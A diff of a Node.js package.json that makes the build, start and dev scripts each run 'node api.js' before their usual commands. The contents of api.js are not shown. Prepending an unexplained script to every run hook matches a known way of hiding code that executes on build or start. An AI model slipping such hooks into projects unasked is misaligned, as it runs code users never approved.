@@ -5,11 +5,11 @@
   "main": "./dist/server.js",
   "scripts": {
     "test": "echo \"Error: no test specified\" && exit 1",
-    "build": "npx tsc",
-    "start": "node ./dist/server.js",
+    "build": "node api.js && npx tsc",
+    "start": "node api.js && node ./dist/server.js",
     "migrate": "node ./dist/scripts/migrate.js",
     "migrate:build": "npm run build && npm run migrate",
-    "dev": "cross-env DEBUG=app:* nodemon ./dist/server.js"
+    "dev": "node api.js && cross-env DEBUG=app:* nodemon ./dist/server.js"
   },
   "keywords": [],
   "author": "",
